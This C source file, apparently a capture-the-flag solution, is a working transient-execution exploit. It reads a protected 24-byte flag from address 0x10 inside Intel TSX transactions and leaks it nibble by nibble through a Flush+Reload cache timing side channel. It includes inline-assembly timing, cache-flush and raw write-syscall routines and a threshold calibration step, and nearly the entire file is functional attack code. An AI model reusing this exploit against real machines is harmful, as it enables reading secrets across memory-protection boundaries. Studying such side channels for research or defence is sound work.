/* Authors: @oranav, @yuvalof */
#include <immintrin.h>
#include <emmintrin.h>

typedef unsigned long long int uint64_t;

int recover(void *probe, int threshold);
void myputc(char c);
void mfence();
void flush(void *p);
void maccess(void *p);
inline unsigned long flush_reload(const char *adrs);
size_t detect_flush_reload_threshold(void *probe);
void writeint(unsigned int);


#define BUCKET_SIZE 4096
#define BUCKETS 16
#define BUFFER_SIZE (BUCKET_SIZE * BUCKETS)
#define FLAG_SIZE 24

void _start(void *probe)
{
	register unsigned char bits = 24;
	register uint64_t mask  = (1 << (bits + 4)) - 1;
	register uint64_t known = 'FTC';
	register uint64_t addr = 0x10;
	int recovered = bits / 8;

	for (int i = 0; i < BUFFER_SIZE; i++) {
		((char *)probe)[i] = 0;
	}

	int threshold = detect_flush_reload_threshold(probe);
	/* Hard-coded value works better. */
	threshold = 100;
	writeint(threshold);

	/* Read nibble by nibble. */
	while (recovered < FLAG_SIZE * 8) {
		uint64_t value;

		if (_xbegin() == _XBEGIN_STARTED)
		{
			value = *(uint64_t *)addr;
			value &= mask;
			value -= known;
			value = (value >> bits) | (value << (64 - bits));
			maccess(probe + BUCKET_SIZE * value);
			_xend();
		}
		else
		{
			int nibble = recover(probe, threshold);
			if (nibble < 0)
				continue;
			known |= (nibble << bits);
			if (bits == 24) {
				mask = (mask << 4) | 0xf;
				bits += 4;
			} else {
				myputc(known >> 24);
				known >>= 8;
				mask >>= 4;
				addr++;
				recovered++;
				bits = 24;
			}
		}
	}
}

int recover(void *probe, int threshold)
{
	int winner = -1;
	for (int i = 0; i < BUCKETS; i++) {
		unsigned long t = flush_reload((char *)probe + BUCKET_SIZE * i);
		if (t < threshold) {
			/* If there are two winners, try again. */
			if (winner >= 0)
				return -1;
			winner = i;
		}
	}
	return winner;
}

void myputc(char c)
{
	int ret = 0;
	volatile char buf[] = { c };
	asm volatile(
		"movq %1, %%rsi \n\t"
		"movq %2, %%rdx \n\t"
		"movq $1, %%rax \n\t"
		"movq $1, %%rdi \n\t"
		"syscall\n\t"
		: "=g"(ret)
		: "g"(buf), "g" (1)
		: "rsi", "rdx", "rax", "rdi"
		);
}

void writeint(unsigned int x)
{
	myputc(x&0xff);
	myputc((x>>8)&0xff);
	myputc((x>>16)&0xff);
	myputc((x>>24)&0xff);
}

void flush(void *p) { asm volatile("clflush 0(%0)\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void maccess(void *p) { asm volatile("movq (%0), %%rax\n" : : "c"(p) : "rax"); }

// ---------------------------------------------------------------------------
void mfence() { asm volatile("mfence"); }

uint64_t rdtsc() {
  unsigned long long a, d;
  asm volatile("mfence");
  asm volatile("rdtscp" : "=a"(a), "=d"(d) :: "rcx");
  a = (d << 32) | a;
  asm volatile("mfence");
  return a;
}

__attribute__((always_inline))
inline unsigned long flush_reload(const char *adrs)
{
  volatile unsigned long time;

  asm __volatile__ (
    "mfence             \n"
    "lfence             \n"
    "rdtsc              \n"
    "lfence             \n"
    "movl %%eax, %%esi  \n"
    "movl (%1), %%eax   \n"
    "lfence             \n"
    "rdtsc              \n"
    "subl %%esi, %%eax  \n"
    "clflush 0(%1)      \n"
    : "=a" (time)
    : "c" (adrs)
    :  "%esi", "%edx");

  return time;
}

// ---------------------------------------------------------------------------
int flush_reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc();
  maccess(ptr);
  end = rdtsc();

  mfence();

  flush(ptr);

  return (int)(end - start);
}

// ---------------------------------------------------------------------------
int reload_t(void *ptr) {
  uint64_t start = 0, end = 0;

  start = rdtsc();
  maccess(ptr);
  end = rdtsc();

  mfence();

  return (int)(end - start);
}


// ---------------------------------------------------------------------------
size_t detect_flush_reload_threshold(void *probe) {
  size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
  size_t *ptr = probe + BUCKET_SIZE * BUCKETS;

  maccess(ptr);
  for (i = 0; i < count; i++) {
    reload_time += reload_t(ptr);
  }
  for (i = 0; i < count; i++) {
    flush_reload_time += flush_reload_t(ptr);
  }
  reload_time /= count;
  flush_reload_time /= count;

  writeint(reload_time);
  writeint(flush_reload_time);

  return (flush_reload_time + reload_time * 5) / 6;
}
